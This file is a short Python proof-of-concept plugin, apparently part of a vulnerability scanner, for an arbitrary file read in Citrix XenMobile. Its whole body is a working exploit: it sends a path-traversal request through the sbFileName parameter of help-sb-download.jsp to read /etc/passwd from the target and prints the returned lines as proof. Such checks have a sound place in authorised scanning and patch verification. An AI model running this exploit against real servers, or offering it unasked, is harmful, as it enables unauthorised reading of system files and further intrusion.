# -*- coding:utf-8 -*-
# Citrix XenMobile 任意文件读取

from .. import  fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False


    def read_file(self, url, filename='/etc/passwd'):
        resp = self.requestUtil.get(url + "/jsp/help-sb-download.jsp?sbFileName=%s" % ("../" * 8 + filename))
        if resp.status_code == 200:
            return resp.text


    def fingerprint(self):
        try:
            if "XenMobile" in self.service.title:
                return True
        except:
            return False


    def poc(self):
        try:
            result = self.read_file(self.service.url)
            print(result)
            if True:
                if "root" in result:
                    return ["Citrix XenMobile 任意文件读取", "<b>/etc/passwd: </b><br>%s<br>..." % "<br>".join(result.split("\n")[:2])]
        except:
            return []
